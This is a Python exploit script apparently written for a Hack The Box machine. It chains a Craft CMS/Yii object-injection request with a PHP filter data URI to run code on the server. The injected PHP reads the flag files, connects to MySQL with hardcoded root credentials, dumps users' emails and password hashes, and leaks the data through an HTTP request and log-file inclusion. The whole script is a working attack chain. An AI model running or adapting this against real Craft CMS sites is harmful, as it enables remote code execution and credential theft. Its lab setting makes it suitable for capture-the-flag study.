import requests, re, base64, time, urllib.parse

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    item_file = 'php://filter/read=convert.base64-decode/resource/data://text/plain;base64,' + b64
    s = requests.Session()
    s.get(f'{HOST}/index.php?p=admin/dashboard')
    r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
    tok = m.group(1) if m else ''
    body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":item_file}]}}}
    headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=30)

# PHP code: read flags and send via loopback with correct URL format
php = (
    '<?php '
    '$uf = @file_get_contents("/home/adam/user.txt"); '
    '$rf = @file_get_contents("/root/root.txt"); '
    '$uf = $uf !== false ? trim($uf) : "NOUF"; '
    '$rf = $rf !== false ? trim($rf) : "NORF"; '
    'try { '
    '  $db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); '
    '  $us = $db->query("SELECT id,username,email,password FROM users")->fetchAll(PDO::FETCH_ASSOC); '
    '  $ud = json_encode($us); '
    '} catch (Exception $e) { $ud = "DBERR:" . $e->getMessage(); } '
    '# Make loopback request with query string in URL '
    '$url = "http://127.0.0.1/?EXUF=" . urlencode($uf) . "&EXRF=" . urlencode($rf) . "&EXUD=" . urlencode($ud); '
    '$ctx = stream_context_create(["http" => ["timeout" => 3, "method" => "GET"]]); '
    '@file_get_contents($url, false, $ctx); '
    '?>'
)

print("[*] Making loopback request with correct URL format ...")
r = inject_b64(php)
print(f"    Status: {r.status_code}")
time.sleep(5)

# Touch access.log and read it
inject_b64('<?php @touch("/var/log/nginx/access.log"); @opcache_invalidate("/var/log/nginx/access.log", true); ?>')
time.sleep(1)

# Include access.log
s = requests.Session()
s.get(f'{HOST}/index.php?p=admin/dashboard')
r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
tok = m.group(1) if m else ''
body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/var/log/nginx/access.log"}]}}}
headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
r3 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=30)

print(f"    Status: {r3.status_code}, Len: {len(r3.text)}")
t = r3.text

# Search for our data
for kw in ['EXUF=', 'EXRF=', 'EXUD=', 'NOUF', 'NORF', 'HTB{', 'flag{']:
    if kw in t:
        idx = t.index(kw)
        print(f'[+] FOUND "{kw}" at byte {idx}')
        # URL decode and show
        end = min(idx + 500, len(t))
        raw = t[idx:end]
        decoded = urllib.parse.unquote(raw)
        print(f'    Raw: {raw[:300]}')
        print(f'    Decoded: {decoded[:300]}')

# Show the newest log entries (before the error trace)
trace_idx = t.find('#0 /var/www')
if trace_idx > 0:
    log_section = t[:trace_idx]
    lines = [l for l in log_section.split('\n') if l.strip()]
    print(f'\n--- Newest 20 log entries ---')
    for line in lines[-20:]:
        print(line[:250])
else:
    print(f'\n--- Last 2000 bytes ---')
    print(t[-2000:])
